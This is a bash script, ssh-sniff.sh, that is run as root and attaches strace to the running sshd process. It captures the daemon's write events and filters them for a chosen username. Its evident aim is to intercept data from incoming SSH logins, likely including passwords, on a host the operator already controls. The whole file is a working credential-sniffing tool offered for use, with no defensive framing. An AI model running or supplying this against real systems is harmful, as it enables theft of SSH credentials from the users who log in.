#!/bin/bash
# Tries to sniff incoming SSH connections
# MUST BE RUN AS ROOT!
if [ -z "$1" ]; then
        echo "Usage: ./ssh-sniff.sh <username>"
        exit 0
fi

USERNAME=$1

# Get the PID of the sshd process
PID=$(pgrep -f "/usr/sbin/sshd -D")

if [ -z "$PID" ]
then
        echo "sshd does not appear to be running!"
        echo "Check manually using ps (it may have a different command line)"
        exit 0
fi

echo "Waiting for ssh connections from $USERNAME..."
echo "Ctrl+C to exit"

# Trace the sshd process for write events, and grep for the username
# If this fails, it's probably because someone else is also tracing sshd
# NOTE: grep context may need tweaking
strace -f -p $PID -e write 2>&1 | grep -B 2 -A 10 $USERNAME

if [ $? -eq 1 ]
then
  echo "Couldn't trace sshd process!"
  echo "Either someone else is already running strace, or ours was killed."
fi
